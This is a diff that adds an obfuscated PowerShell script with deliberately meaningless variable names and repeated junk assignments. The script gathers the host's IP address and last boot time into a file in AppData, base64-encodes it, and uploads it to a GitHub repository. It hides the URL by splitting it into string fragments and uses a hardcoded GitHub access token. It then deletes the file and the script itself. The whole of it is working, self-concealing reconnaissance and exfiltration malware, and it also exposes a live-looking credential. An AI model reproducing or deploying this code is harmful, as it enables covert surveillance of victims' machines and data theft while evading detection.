@@ -1,0 +1,34 @@
+$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
+$Cisvoisvfosdnogfer = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0]
+$dbvfbmdofnmsdg = Get-Date -Format "MMdd_HHmm"
+$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
+$CVVbosdfigoisdrgvlx = "$Cisvoisvfosdnogfer-$dbvfbmdofnmsdg-XXX-kkk.txt"
+$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
+$CVsdovcmsdmsdfsfr = Join-Path $env:appdata $CVVbosdfigoisdrgvlx
+$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $CVsdovcmsdmsdfsfr
+$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
+$NNOSIjvodvfsd = $CVsdovcmsdmsdfsfr
+
+$AAAPofkef = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" + "pos/johnstones19850308/john/contents/report/" + $CVVbosdfigoisdrgvlx
+$VVPOKMSKCskmcsdcsd = "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"
+
+$ttttpp = $env:APPDATA
+$sdvdfbfghfgh = Get-Content -Path $NNOSIjvodvfsd -Encoding Byte
+$sdvdfbfghfghBase64 = [Convert]::ToBase64String($sdvdfbfghfgh)
+$fgdfgjsdg = "sdvgspdjgp_)V;'sdv;sdvlmfbmcgmdfmbpm[spf[pl[qwf$#*(^U(JBGIdfbdbdbSNf"
+$body = @{
+    message = "Upload file $CVVbosdfigoisdrgvlx"
+    content = $sdvdfbfghfghBase64
+    branch = "main"
+}
+$headers = @{
+    "Authorization" = "token $VVPOKMSKCskmcsdcsd"
+    "Content-Type" = "application/json"
+}
+
+
+$response = Invoke-RestMethod -Uri $AAAPofkef -Method Put -Body ($body | ConvertTo-Json) -Headers $headers
+
+Remove-Item -Path $CVsdovcmsdmsdfsfr -Force;
+Remove-Item -Path $MyInvocation.MyCommand.Path -Force;
